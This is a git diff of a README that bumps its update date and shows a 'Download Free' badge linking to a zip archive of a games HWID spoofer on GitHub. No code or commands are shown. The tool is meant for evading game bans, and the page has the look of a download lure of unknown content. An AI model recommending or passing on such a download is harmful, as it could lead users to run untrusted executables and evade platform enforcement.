@@ -1,4 +1,4 @@
-# Updated 06.12.2024
+# Updated 14.12.2024
 
 # Download:
 [<img src="https://img.shields.io/badge/Hwid_Spoofer-Download_Free-blue?style=for-the-badge">](https://github.com/Ritafl/Games-HWID-Spoofer/releases/download/games/hwid_spoof_installing.zip)
